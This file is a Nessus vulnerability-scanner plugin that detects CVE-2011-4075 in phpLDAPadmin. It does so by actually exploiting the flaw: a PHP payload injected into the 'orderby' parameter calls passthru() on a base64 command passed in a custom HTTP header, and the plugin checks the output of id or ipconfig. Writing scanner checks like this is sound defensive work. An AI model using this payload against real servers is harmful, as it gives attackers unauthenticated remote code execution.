#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(56703);
  script_version("$Revision: 1.15 $");
  script_cvs_date("$Date: 2016/11/23 20:42:23 $");

  script_cve_id("CVE-2011-4075");
  script_bugtraq_id(50331);
  script_osvdb_id(76593, 76594);
  script_xref(name:"EDB-ID", value:"18021");
  script_xref(name:"EDB-ID", value:"18031");

  script_name(english:"phpLDAPadmin orderby Parameter Arbitrary PHP Code Execution");
  script_summary(english:"Tries to run a command");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a PHP application that can be abused to
execute arbitrary PHP code."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of phpLDAPadmin installed on the remote host does not
sanitize input to the 'orderby' parameter of the 'cmd.php' script when
'cmd' is set to 'query_engine' before using it in a call to
'create_function()'.

An unauthenticated, remote attacker can leverage this issue to execute
arbitrary PHP code on the affected host, subject to the privileges
under which the web server runs."
  );
  script_set_attribute(attribute:"see_also", value:"http://sourceforge.net/support/tracker.php?aid=3417184");
  # http://phpldapadmin.git.sourceforge.net/git/gitweb.cgi?p=phpldapadmin/phpldapadmin;h=76e6dad
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?4d5eab60");
  script_set_attribute(
    attribute:"solution",
    value:
"Apply the patch to 'lib/functions.php' in the project's GIT
repository."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"phpLDAPadmin 1.2.1.1 RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'phpLDAPadmin query_engine Remote PHP Code Injection');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

script_set_attribute(attribute:"vuln_publication_date", value:"2011/10/23");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/10/05");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/11/03");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:deon_george:phpldapadmin");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2016 Tenable Network Security, Inc.");

  script_dependencies("phpldapadmin_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/PHP", "www/phpLDAPadmin");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");


port = get_http_port(default:80, php:TRUE, embedded:FALSE);


install = get_install_from_kb(appname:"phpLDAPadmin", port:port, exit_on_fail:TRUE);
dir = install['dir'];


# Try to exploit the issue to run a command.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig /all';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig'] = "Subnet Mask";

semaphore = '_' + SCRIPT_NAME - '.nasl' + '_';

# We need a cookie for the exploits to work.
init_cookiejar();

url = dir + '/';
res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail:TRUE);

foreach cmd (cmds)
{
  payload = 'nessus));}}' +
    'error_reporting(0);' +
    'print(' + semaphore + ');' +
    'passthru(base64_decode($_SERVER[HTTP_CMD]));' +
    'die;/*';

  url = dir + '/cmd.php?' +
    'cmd=query_engine&' +
    'query=none&' +
    'search=1&' +
    'orderby=' + urlencode(str:payload, unreserved:"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!~*'()-]/=;<>$[]");

  res = http_send_recv3(
    port         : port,
    method       : "GET",
    item         : url,
    add_headers  : make_array("Cmd", base64(str:cmd)),
    exit_on_fail : TRUE
  );

  if (
    semaphore >< res[2] &&
    egrep(pattern:cmd_pats[cmd], string:res[2])
  )
  {
    if (report_verbosity > 0)
    {
      output = strstr(res[2], semaphore) - semaphore;
      if (!egrep(pattern:cmd_pats[cmd], string:output)) output = "";

      report =
        '\nNessus was able to verify the issue exists using the following request :' +
        '\n' +
        '\n' + crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30) +
        '\n' + http_last_sent_request() +
        '\n' + crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30) + '\n';

      if (report_verbosity > 1)
      {
        report +=
          '\n' + 'This produced the following output :' +
          '\n' +
          '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) +
          '\n' + chomp(output) +
          '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
      }

      report +=
        '\n' + 'Note that the Cookie header in the request above uses a value' +
        '\n' + 'returned after visiting the application\'s initial page. The value' +
        '\n' + 'reported above may have expired and need to be updated in order to' +
        '\n' + 'validate the finding.';

      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}
exit(0, "The phpLDAPadmin install at "+build_url(port:port, qs:dir+'/')+" is not affected.");
